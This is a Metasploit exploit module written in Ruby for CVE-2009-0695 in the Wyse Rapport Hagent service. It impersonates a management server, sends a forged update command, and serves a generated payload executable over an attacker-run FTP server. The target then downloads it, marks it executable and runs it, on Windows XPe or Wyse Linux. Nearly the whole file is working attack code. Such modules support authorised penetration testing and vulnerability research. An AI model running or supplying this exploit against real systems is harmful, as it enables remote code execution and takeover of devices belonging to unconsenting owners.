##
# $Id: hagent_untrusted_hsdata.rb
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'timeout'
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::FtpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Wyse Rapport Hagent Fake Hserver Command Execution',
			'Description'    => %q{
				This module exploits the Wyse Rapport Hagent service by pretending to
			be a legitimate server. This process involves starting both HTTP and 
			FTP services on the attacker side, then contacting the Hagent service of
			the target and indicating that an update is available. The target will
			then download the payload wrapped in an executable from the FTP service.
			},
			'Stance'         => Msf::Exploit::Stance::Aggressive,
			'Author'         => 'kf',
			'Version'        => '$Revision$',
			'References'     => 
				[
					['CVE', '2009-0695'],
					['OSVDB', '55839'],
					['US-CERT-VU', '654545'],
					['URL', 'http://snosoft.blogspot.com/'],
					['URL', 'http://www.theregister.co.uk/2009/07/10/wyse_remote_exploit_bugs/'],
					['URL', 'http://www.wyse.com/serviceandsupport/support/WSB09-01.zip'],
					['URL', 'http://www.wyse.com/serviceandsupport/Wyse%20Security%20Bulletin%20WSB09-01.pdf'],
				],
			'Payload'        =>
				{
					'Space'    => 2048,
					'BadChars' => '',
				},
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Targets'        => 
					[
						[ 'Windows XPe x86',{'Platform' => 'win',}],
						[ 'Wyse Linux x86', {'Platform' => 'linux',}],
					],
			'DefaultTarget'  => 0,
			'Privileged'     => true
		))

		register_options([
			OptPort.new('SRVPORT',    [ true, "The local port to use for the FTP server", 21 ]),
			Opt::RPORT(80),
		], self.class)
	end


	def exploit
	
		if(datastore['SRVPORT'].to_i != 21)
			print_error("This exploit requires the FTP service to run on port 21")
			return
		end
		
		# Connect to the target service
		print_status("Connecting to the target")
		connect()
		
		# Start the FTP service
		print_status("Starting the FTP server")
		start_service()
		
		# Create the executable with our payload
		print_status("Generating the EXE")
		if target['Platform'] == 'win'
			@exe_file = Msf::Util::EXE.to_win32pe(framework, payload.encoded)
			maldir      = "C:\\"  		# Windows
			malfile     = Rex::Text.rand_text_alphanumeric(rand(8)+4) + ".exe"
			co = "XP"
		elsif  target['Platform'] == 'linux'
			@exe_file = Msf::Util::EXE.to_linux_x86_elf(framework, payload.encoded)
			maldir      = "//tmp//"		# Linux
			malfile     = Rex::Text.rand_text_alphanumeric(rand(8)+4) + ".bin"
			co = "LXS"
		end
		@exe_sent = false

		# Start the HTTP service
		print_status("Starting the HTTP service")
		wdmserver  = Rex::Socket::TcpServer.create({
			'Context'   => {
				'Msf'        => framework,
				'MsfExploit' => self
			}
		})
		
		wdmserver_port = wdmserver.getsockname[2]
		print_status("Starting the HTTP service on port #{wdmserver_port}")
		
		
		fakerapport = Rex::Socket.source_address(rhost)
		fakemac     = "00" + Rex::Text.rand_text(5).unpack("H*")[0]
		mal = "&V54&CI=3|MAC=#{fakemac}|IP=#{rhost}MT=3|HS=#{fakerapport}|PO=#{wdmserver_port}|"

		# FTP Credentials 
		ftpserver = Rex::Socket.source_address(rhost)
		ftpuser   = Rex::Text.rand_text_alphanumeric(rand(8)+1)
		ftppass   = Rex::Text.rand_text_alphanumeric(rand(8)+1)
		ftpport   = 21
		ftpsecure = '0'

		incr = 10  
		pwn1 = 
		"&UP0|&SI=1|UR=9" +
		"|CO \x0f#{co}\x0f|#{incr}" +
		# "|LU \x0fRapport is downloading HAgent Upgrade to this terminal\x0f|#{incr+1}" +
		"|SF \x0f#{malfile}\x0f \x0f#{maldir}#{malfile}\x0f|#{incr+1}" 

		pwn2 = 
	 	"|EX \x0f//bin//chmod\xfc+x\xfc//tmp//#{malfile}\x0f|#{incr+1}" 

		pwn3 = 
		"|EX \x0f#{maldir}#{malfile}\x0f|#{incr+1}" +
		# "|RB|#{incr+1}" + 
		# "|SV* \x0fHKEY_LOCAL_MACHINE\\Software\\Rapport\\pwnt\x0f 31337\x0f\x0f REG_DWORD\x0f|#{incr+1}" +
		#"|DF \x0f#{maldir}#{malfile}\x0f|#{incr+1}" + 
		# FTP Paramaters 
		"|&FTPS=#{ftpserver}" + "|&FTPU=#{ftpuser}" + "|&FTPP=#{ftppass}" + "|&FTPBw=10240" + "|&FTPST=200" + "|&FTPPortNumber=#{ftpport}" + "|&FTPSecure=#{ftpsecure}" +
		"|&M_FTPS=#{ftpserver}" + "|&M_FTPU=#{ftpuser}" + "|&M_FTPP=#{ftppass}" + "|&M_FTPBw=10240" + "|&M_FTPST=200" + "|&M_FTPPortNumber=#{ftpport}" + "|&M_FTPSecure=#{ftpsecure}" +
		# No clue
		"|&DP=1|&IT=3600|&CID=7|QUB=3|QUT=120|CU=1|"

		if target['Platform'] == 'win'
			pwn = pwn1 + pwn3 
		elsif target['Platform'] == 'linux'
			pwn = pwn1 + pwn2 + pwn3 
		end
		# Send the malicious request
		sock.put(mal)
		
		# Download some response data
		resp = sock.get_once(-1, 10) 
		print_status("Received: " + resp)
		
		print_status("Waiting on a connection to the HTTP service")
		begin
			Timeout.timeout(190) do
			done = false
			while (not done and session = wdmserver.accept)
				req = session.recvfrom(2000)[0]
				next if not req
				next if req.empty?
				print_status("HTTP Request: #{req.split("\n")[0].strip}")
				
				case req
  				when /V01/
		   	 		print_status("++ connected (#{session.peerhost}), " + "sending payload (#{pwn.size} bytes)")
					res = pwn 					
				when /V02/
					print_status("++ device sending V02 query...")
					res  = "&00|Existing Client With No Pending Updates|&IT=10|&CID=7|QUB=3|QUT=120|CU=1|"
					done = true
					
  				when /V55/
		  	 		print_status("++ device sending V55 query...")
					res = pwn 				
  				when /POST/  # PUT is used for non encrypted requests.
		  	 		print_status("++ device sending V55 query...")
					res = pwn 				
					done = true
				else
					print_status("+++ sending generic response...")
					res = pwn 
				end
				
				print_status("Sending reply: #{res}")
				session.put(res)
  				session.close
			end
			end
		rescue ::TimeoutError
			print_status("Timed out waiting on the HTTP request")
			wdmserver.close
			disconnect()
			stop_service()
			return
		end
		
		print_status("Waiting on the FTP request...")
		stime = Time.now.to_f
		while(not @exe_sent)
			break if (stime + 90 < Time.now.to_f)
			select(nil, nil, nil, 0.25)	
		end
		
		if(not @exe_sent)
			print_status("No executable sent :(")
		end
		
		stop_service()
		wdmserver.close()
		
		handler
		disconnect
	end

	def on_client_command_retr(c,arg)
		print_status("#{@state[c][:name]} FTP download request for #{arg}")
		conn = establish_data_connection(c)
		if(not conn)
			c.put("425 Can't build data connection\r\n")
			return
		end
		
		c.put("150 Opening BINARY mode data connection for #{arg}\r\n")
		conn.put(@exe_file)
		c.put("226 Transfer complete.\r\n")
		conn.close
		@exe_sent = true
	end
	
	def on_client_command_size(c,arg)
		print_status("#{@state[c][:name]} FTP size request for #{arg}")
		c.put("213 #{@exe_file.length}\r\n")
	end


end

